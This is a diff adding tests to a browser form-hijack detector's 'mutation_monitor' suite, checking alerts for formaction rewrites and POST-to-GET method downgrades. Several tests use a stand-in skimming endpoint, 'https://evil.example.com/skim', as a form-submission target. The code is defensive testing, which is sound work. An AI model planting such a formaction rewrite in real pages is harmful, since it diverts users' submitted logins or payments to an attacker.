@@ -437,6 +437,190 @@ describe("mutation_monitor DOM integration", () => {
     stopMutationMonitor();
   });
 
+  it("detects cross-domain submitter formaction rewrite as HIGH form_action_changed (#812)", async () => {
+    const alerts: MutationAlert[] = [];
+    startMutationMonitor(document, (a) => alerts.push(a));
+
+    const form = document.createElement("form");
+    form.setAttribute("action", "/login");
+    const button = document.createElement("button");
+    button.setAttribute("type", "submit");
+    button.setAttribute("formaction", "/pay");
+    form.appendChild(button);
+    document.body.appendChild(form);
+
+    // Baseline the submitter override: the first attribute mutation on an
+    // unseen element records, never alerts (append alone creates no
+    // attribute record).
+    button.setAttribute("formaction", "/pay");
+    await vi.advanceTimersByTimeAsync(150);
+
+    button.setAttribute("formaction", "https://evil.example.com/skim");
+
+    vi.advanceTimersByTime(150);
+    await vi.advanceTimersByTimeAsync(150);
+
+    const actionAlerts = alerts.filter((a) => a.type === "form_action_changed");
+    expect(actionAlerts.length).toBeGreaterThanOrEqual(1);
+    expect(actionAlerts[0]!.severity).toBe("high");
+    expect(actionAlerts[0]!.details).toContain("evil.example.com");
+
+    form.remove();
+    stopMutationMonitor();
+  });
+
+  it("detects same-origin submitter formaction rewrite as MEDIUM (#812)", async () => {
+    const alerts: MutationAlert[] = [];
+    startMutationMonitor(document, (a) => alerts.push(a));
+
+    const form = document.createElement("form");
+    const button = document.createElement("button");
+    button.setAttribute("type", "submit");
+    button.setAttribute("formaction", "/pay");
+    form.appendChild(button);
+    document.body.appendChild(form);
+
+    button.setAttribute("formaction", "/pay");
+    await vi.advanceTimersByTimeAsync(150);
+
+    button.setAttribute("formaction", "/pay-v2");
+
+    vi.advanceTimersByTime(150);
+    await vi.advanceTimersByTimeAsync(150);
+
+    const actionAlerts = alerts.filter((a) => a.type === "form_action_changed");
+    expect(actionAlerts.length).toBeGreaterThanOrEqual(1);
+    expect(actionAlerts[0]!.severity).toBe("medium");
+
+    form.remove();
+    stopMutationMonitor();
+  });
+
+  it("does not alert for submitter formaction first sight (#812)", async () => {
+    const alerts: MutationAlert[] = [];
+    startMutationMonitor(document, (a) => alerts.push(a));
+
+    // Appended after monitoring started with the override already present:
+    // first sight baselines, mirroring form-action semantics.
+    const form = document.createElement("form");
+    const button = document.createElement("button");
+    button.setAttribute("type", "submit");
+    button.setAttribute("formaction", "https://evil.example.com/skim");
+    form.appendChild(button);
+    document.body.appendChild(form);
+
+    button.setAttribute("formaction", "https://evil.example.com/skim");
+
+    vi.advanceTimersByTime(150);
+    await vi.advanceTimersByTimeAsync(150);
+
+    const actionAlerts = alerts.filter((a) => a.type === "form_action_changed");
+    expect(actionAlerts.length).toBe(0);
+
+    form.remove();
+    stopMutationMonitor();
+  });
+
+  it("detects form method POST-to-GET downgrade as MEDIUM form_method_changed (#812)", async () => {
+    const alerts: MutationAlert[] = [];
+    startMutationMonitor(document, (a) => alerts.push(a));
+
+    const form = document.createElement("form");
+    form.setAttribute("action", "/login");
+    form.setAttribute("method", "post");
+    document.body.appendChild(form);
+
+    // Baseline post, then downgrade.
+    form.setAttribute("method", "post");
+    await vi.advanceTimersByTimeAsync(150);
+
+    form.setAttribute("method", "get");
+
+    vi.advanceTimersByTime(150);
+    await vi.advanceTimersByTimeAsync(150);
+
+    const methodAlerts = alerts.filter((a) => a.type === "form_method_changed");
+    expect(methodAlerts.length).toBeGreaterThanOrEqual(1);
+    expect(methodAlerts[0]!.severity).toBe("medium");
+
+    form.remove();
+    stopMutationMonitor();
+  });
+
+  it("detects submitter formmethod POST-to-GET downgrade as MEDIUM (#812)", async () => {
+    const alerts: MutationAlert[] = [];
+    startMutationMonitor(document, (a) => alerts.push(a));
+
+    const form = document.createElement("form");
+    const button = document.createElement("button");
+    button.setAttribute("type", "submit");
+    button.setAttribute("formmethod", "post");
+    form.appendChild(button);
+    document.body.appendChild(form);
+
+    button.setAttribute("formmethod", "post");
+    await vi.advanceTimersByTimeAsync(150);
+
+    button.setAttribute("formmethod", "get");
+
+    vi.advanceTimersByTime(150);
+    await vi.advanceTimersByTimeAsync(150);
+
+    const methodAlerts = alerts.filter((a) => a.type === "form_method_changed");
+    expect(methodAlerts.length).toBeGreaterThanOrEqual(1);
+    expect(methodAlerts[0]!.severity).toBe("medium");
+
+    form.remove();
+    stopMutationMonitor();
+  });
+
+  it("does not alert for formmethod GET-to-POST upgrade (#812)", async () => {
+    const alerts: MutationAlert[] = [];
+    startMutationMonitor(document, (a) => alerts.push(a));
+
+    const form = document.createElement("form");
+    form.setAttribute("formmethod", "get");
+    document.body.appendChild(form);
+
+    form.setAttribute("formmethod", "get");
+    await vi.advanceTimersByTimeAsync(150);
+
+    form.setAttribute("formmethod", "post");
+
+    vi.advanceTimersByTime(150);
+    await vi.advanceTimersByTimeAsync(150);
+
+    const methodAlerts = alerts.filter((a) => a.type === "form_method_changed");
+    expect(methodAlerts.length).toBe(0);
+
+    form.remove();
+    stopMutationMonitor();
+  });
+
+  it("does not alert for formmethod churn on non-submittable elements (#812)", async () => {
+    const alerts: MutationAlert[] = [];
+    startMutationMonitor(document, (a) => alerts.push(a));
+
+    // `formmethod` on a div is meaningless HTML; only FORM/BUTTON/INPUT carry
+    // submission semantics worth journaling.
+    const div = document.createElement("div");
+    document.body.appendChild(div);
+
+    div.setAttribute("formmethod", "post");
+    await vi.advanceTimersByTimeAsync(150);
+
+    div.setAttribute("formmethod", "get");
+
+    vi.advanceTimersByTime(150);
+    await vi.advanceTimersByTimeAsync(150);
+
+    const methodAlerts = alerts.filter((a) => a.type === "form_method_changed");
+    expect(methodAlerts.length).toBe(0);
+
+    div.remove();
+    stopMutationMonitor();
+  });
+
   it("detects suspicious hidden iframe injection", async () => {
     const alerts: MutationAlert[] = [];
     startMutationMonitor(document, (a) => alerts.push(a));
